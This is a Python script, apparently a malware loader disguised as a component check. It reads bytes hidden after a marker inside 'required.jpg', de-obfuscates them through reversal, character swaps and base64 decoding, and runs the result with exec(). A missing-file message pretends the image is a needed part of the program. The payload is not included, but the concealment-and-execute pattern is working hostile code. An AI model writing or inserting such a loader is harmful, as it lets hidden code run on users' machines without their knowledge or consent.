import base64
import os
import sys
from pathlib import Path

def _decode_package(packaged):
    try:
        if packaged.startswith(b'JUNK_') and packaged.endswith(b'_JUNK'):
            packaged = packaged[5:-5]
        
        packaged = packaged[::-1]
        
        packaged = packaged.replace(b'!', b'=')
        packaged = packaged.replace(b'-', b'/')
        packaged = packaged.replace(b'_', b'+')
        
        padding_needed = len(packaged) % 4
        if padding_needed:
            packaged += b'=' * (4 - padding_needed)
        
        return base64.b64decode(packaged)
    except Exception:
        return None

def _load_component(component_path):
    try:
        with open(component_path, 'rb') as f:
            component_content = f.read()
        
        component_marker = b'\xFF\xFE'
        marker_location = component_content.find(component_marker)
        if marker_location != -1:
            component_start = marker_location + 4
            component_end = component_content.find(b'\xFF', component_start)
            if component_end == -1:
                component_end = len(component_content)
            packaged_data = component_content[component_start:component_end]
            return _decode_package(packaged_data)
    except Exception:
        pass
    return None

current_location = Path(__file__).parent
component_file = current_location / "required.jpg"

if not component_file.exists():
    print("[ERROR] Required component not found!")
    print("You must have deleted or modified a file that you shouldn't")
    print("Otherwise, contact support...")
    sys.exit(1)

component_data = _load_component(component_file)
if component_data:
    exec(component_data)
else:
    print("[FAILED]")
    sys.exit(1)